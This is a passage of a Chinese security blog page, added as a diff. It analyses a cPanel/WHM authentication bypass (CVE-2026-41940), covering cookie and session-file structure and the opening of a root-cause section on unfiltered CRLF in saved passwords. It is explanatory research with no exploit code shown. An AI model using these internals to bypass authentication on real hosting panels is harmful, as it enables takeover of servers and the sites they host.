@@ -1,0 +1,1327 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    
+    <meta name="author" content="Nevolar">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://blog.mikuwa.com/2026/05/fb2e7128ef33.html"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2026-41940 cPanel／WHM 认证绕过漏洞分析">
+<meta property="og:url" content="https://blog.mikuwa.com/2026/05/fb2e7128ef33.html">
+<meta property="og:site_name" content="Nevolar&#39;s Blog">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.mikuwa.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-05-06T03:24:34.244Z">
+<meta property="article:modified_time" content="2026-05-06T03:24:35.281Z">
+<meta property="article:author" content="Nevolar">
+<meta property="article:tag" content="cpanel">
+<meta property="article:tag" content="严重漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.mikuwa.com/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="https://cn.cravatar.com/avatar/7e52725e1bebc3875d0d0871c6a7e65f?s=250&amp;r=G&amp;d=mp&amp;ver=1768716737" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://cn.cravatar.com/avatar/7e52725e1bebc3875d0d0871c6a7e65f?s=250&amp;r=G&amp;d=mp&amp;ver=1768716737">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="https://cn.cravatar.com/avatar/7e52725e1bebc3875d0d0871c6a7e65f?s=250&r=G&d=mp&ver=1768716737">
+    <!--- Page Info-->
+    
+    <title>
+        
+            CVE-2026-41940 cPanel／WHM 认证绕过漏洞分析 | Nevolar&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+        
+            
+    
+            
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"blog.mikuwa.com","root":"/","language":"zh-CN","path":"search.json"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":true,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":true,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":false},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Be yourself anyway","subtitle":{"text":["学而不思则罔，思而不学则殆","旧日留故人，期许看今朝"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":[{"icon":"fa-brands fa-github","url":"https://github.com/Neoaler"},{"icon":"fa-brands fa-twitter","url":null},{"icon":"fa-solid fa-at","url":"you@example.com"},{"icon":"fa-brands fa-telegram","url":null},{"icon":"/images/custom-icon.svg","url":null}],"qrs":null}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1","theme":{"light":"default","dark":"dark"}}},"version":"2.9.0","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"书签":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"},"文章":{"icon":"fa-solid fa-book","submenus":{"标签":"/tags/","分类":"/categories","时间轴":"/archives"}},"碎碎念":{"icon":"fa-solid fa-message","path":"/talks/"},"关于":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/Neoaler","友情链接":"/links/"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":3,"tags_style":"blur","masonry":{"batch_size":12,"initial_batch_size":24}},"home":{"sidebar":{"enable":true,"position":"left","first_item":"info","announcement":"这个人很懒, 什么都没留下","show_on_mobile":true,"links":{"标签":{"path":"/tags","icon":"fa-regular fa-tags"},"分类":{"path":"/categories","icon":"fa-regular fa-folder"},"时间轴":{"path":"/archives","icon":"fa-regular fa-archive"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footer":{"runtime":true,"icon":"<i class=\"fa-solid fa-heart fa-beat\" style=\"--fa-animation-duration: 0.5s; color: #f54545\"></i>","start":"2026/2/14 22:00:00","statistics":true,"customize":null,"icp":{"enable":false,"number":null,"url":null}},"footerStart":"2026/2/14 22:00:00","mermaid":{"style":{"light":"default","dark":"dark"}}};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.i18n = {"search":"站内搜索您需要的内容...","toc":"目录","prev":"上一页","next":"下一页","prev_posts":"上一篇","next_posts":"下一篇","page":"第 %d 页","recent_posts":"最新文章","share":"分享","powered_by":"由 %s 驱动","theme":"主题","rss_feed":"RSS Feed","category":"分类","categories":"分类","tag":"标签","tags":"标签","post":"文章","posts":"文章","tagcloud":"标签云","comment":"评论","comments":"评论","top":"置顶","sticky":"置顶","go-back-home":"回到首页","masonry_loading":"照片加载中...","image_viewer":"图片查看器","close":"关闭","exif":{"title":"EXIF","cards":{"camera":"相机","lens":"镜头","exposure":"曝光","other":"其他"},"fields":{"make":"品牌","model":"机型","date_taken":"拍摄时间","lens_model":"镜头","focal_length":"焦距","focus_mode":"对焦模式","shutter":"快门","aperture":"光圈","iso":"感光度","exposure_program":"曝光程序","exposure_compensation":"曝光补偿","metering_mode":"测光模式","flash":"闪光灯","white_balance":"白平衡","latitude":"纬度","longitude":"经度","altitude":"海拔"},"status":{"loading":"加载中...","no_exif":"无 EXIF 信息","library_missing":"EXIF 库未加载","image_source_missing":"图片地址不可用","unavailable":"EXIF 不可用（可能被 CORS 阻止或缺少元数据）","flag_unavailable":"EXIF 不可用"}},"home":"首页","archive":"归档","archives":"归档","about":"关于","links":"链接","link":"链接","friends":"友情链接","friend":"友情链接","timeline":"时间轴","shuoshuo":"说说","bookmarks":"书签","site_uv":"访问人数","site_pv":"总访问量","read_more":"阅读全文","wordcount":"字","min2read":"分钟","changelog":"更新日志","status":"状态","runtime":"博客已运行","days":"天","hours":"小时","minutes":"分钟","seconds":"秒","optimized_by":"并由 Evan 进行优化","rights":"版权所有","site_posts":"共撰写了 %s 篇文章","site_wordcount":"共 %s 字","copyright":{"title":"标题","author":"作者","link":"链接","create_time":"创建于","update_time":"更新于","license_title":"版权声明","license_content":"本文章采用 %s 进行许可。","all_rights_reserved":"版权所有 &#169 %s，禁止转载。","public_domain":"本文为公有领域作品，可自由转载、引用。"},"ago":{"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"},"create_time":"创建","update_time":"更新","expired":"这篇文章最后更新于 %s 天前，内容可能已经过时。"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Nevolar&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/bookmarks/"
+                                        >
+                                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                                    书签
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-solid fa-book fa-fw"></i>
+                                    文章
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/tags/">
+                                                    标签
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="/categories">
+                                                    分类
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="/archives">
+                                                    时间轴
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/talks/"
+                                        >
+                                    <i class="fa-solid fa-message fa-fw"></i>
+                                    碎碎念
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    关于
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://github.com/Neoaler">
+                                                    GITHUB
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="/links/">
+                                                    友情链接
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/bookmarks/"
+                        >
+                            <span>
+                                书签
+                            </span>
+                            
+                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-文章"
+                        >
+                            <span>
+                                文章
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-文章">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/tags/">标签</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/categories">分类</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/archives">时间轴</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/talks/"
+                        >
+                            <span>
+                                碎碎念
+                            </span>
+                            
+                                <i class="fa-solid fa-message fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-关于"
+                        >
+                            <span>
+                                关于
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-关于">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/about">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://github.com/Neoaler">GITHUB</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/links/">友情链接</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/tags"
+                        >
+                            <span>标签</span>
+                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/categories"
+                        >
+                            <span>分类</span>
+                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/archives"
+                        >
+                            <span>时间轴</span>
+                            <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">11</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">11</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">CVE-2026-41940 cPanel／WHM 认证绕过漏洞分析</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="https://cn.cravatar.com/avatar/7e52725e1bebc3875d0d0871c6a7e65f?s=250&r=G&d=mp&ver=1768716737">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Nevolar</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-05-06 03:24:34</span>
+        <span class="mobile">2026-05-06 03:24:34</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-05-06 03:24:35</span>
+            <span class="mobile">2026-05-06 03:24:35</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">漏洞原理</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/cpanel/">cpanel</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9E/">严重漏洞</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>2.9k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>14 分钟</span>
+        </span>
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<blockquote>
+<p>来源：<a class="link"   target="_blank" rel="noopener" href="https://labs.watchtowr.com/the-internet-is-falling-down-falling-down-falling-down-cpanel-whm-authentication-bypass-cve-2026-41940/" >https://labs.watchtowr.com/the-internet-is-falling-down-falling-down-falling-down-cpanel-whm-authentication-bypass-cve-2026-41940/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+</blockquote>
+<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><ul>
+<li>CVE 编号：CVE-2026-41940</li>
+<li>影响范围：所有当前支持的 cPanel &amp; WHM 版本（影响超过 7000 万域名）</li>
+<li>漏洞类型：认证绕过（Authentication Bypass）</li>
+<li>在野利用：已知（多家主机商确认已在野使用作为零日）</li>
+</ul>
+<hr>
+<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>cPanel &amp; WHM 是全球最常用的主机管理面板：</p>
+<ul>
+<li>WHM：管理员面板，root 级别权限，可管理 SSL、SSL 证书、安全协议等</li>
+<li>cPanel：面向用户的控制面板，管理单个托管账户</li>
+</ul>
+<p>WHM 是”王国的钥匙”，cPanel 是”每个公寓的钥匙”。如果王国是互联网，公寓是网站——那就意味着控制了这一切。</p>
+<hr>
+<h2 id="第一部分：cPanel-Session-机制"><a href="#第一部分：cPanel-Session-机制" class="headerlink" title="第一部分：cPanel Session 机制"></a>第一部分：cPanel Session 机制</h2><h3 id="登录流程中的-Session-创建"><a href="#登录流程中的-Session-创建" class="headerlink" title="登录流程中的 Session 创建"></a>登录流程中的 Session 创建</h3><p>当用户尝试登录 WHM 时，无论密码是否正确，服务器都会：</p>
+<ol>
+<li>创建一个预认证 Session，写入磁盘</li>
+<li>返回一个 Set-Cookie：</li>
+</ol>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: whostmgrsession=%3aWg_mjzgt1hyfXefK%2c1bd3d4bf5ecbf83b660789ab0f3198fa</span><br></pre></td></tr></table></figure></div>
+
+<p>URL 解码后为：:Wg_mjzgt1hyfXefK,1bd3d4bf5ecbf83b660789ab0f3198fa</p>
+<h3 id="Cookie-结构"><a href="#Cookie-结构" class="headerlink" title="Cookie 结构"></a>Cookie 结构</h3><p>Cookie 由两部分组成，用逗号分隔：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;session_name&gt;,&lt;ob&gt;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>&lt;session_name&gt;：实际 session 文件名（如 :Wg_mjzgt1hyfXefK）</li>
+<li><ob>：32 位十六进制字符串，每会话一个的秘密密钥</li>
+</ul>
+<h3 id="Session-文件结构"><a href="#Session-文件结构" class="headerlink" title="Session 文件结构"></a>Session 文件结构</h3><p>Session 文件存储在 &#x2F;var&#x2F;cpanel&#x2F;sessions&#x2F;raw&#x2F;，格式为明文 key&#x3D;value，每行用\r\n 分隔：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">local_ip_address=172.17.0.2</span><br><span class="line">external_validation_token=bOOwkwVzFsruooU0</span><br><span class="line">cp_security_token=/cpsess7833455106</span><br><span class="line">needs_auth=1</span><br><span class="line">origin_as_string=address=172.17.0.1,app=whostmgrd,method=badpass</span><br><span class="line">hulk_registered=0</span><br><span class="line">tfa_verified=0</span><br><span class="line">ip_address=172.17.0.1</span><br><span class="line">login_theme=cpanel</span><br></pre></td></tr></table></figure></div>
+
+<p>预认证 session 包含：</p>
+<ul>
+<li>cp_security_token：预发的访问令牌</li>
+<li>source IP：用于 IP 锁定</li>
+<li>tfa_verified：2FA 验证标志</li>
+<li>其他状态信息</li>
+</ul>
+<p>用户最终成功登录后，同一个 session 文件会被”升级”，添加 user&#x3D;… 和 pass&#x3D;… 字段。</p>
+<hr>
+<h2 id="第二部分：漏洞根因-—-saveSession-的两个-Bug"><a href="#第二部分：漏洞根因-—-saveSession-的两个-Bug" class="headerlink" title="第二部分：漏洞根因 — saveSession 的两个 Bug"></a>第二部分：漏洞根因 — saveSession 的两个 Bug</h2><h3 id="Bug-1：密码写盘时不过滤-CRLF"><a href="#Bug-1：密码写盘时不过滤-CRLF" class="headerlink" title="Bug 1：密码写盘时不过滤 CRLF"></a>Bug 1：密码写盘时不过滤 CRLF</h3><p>在未打补丁的版本中，saveSession 函数对密码的处理如下：</p>
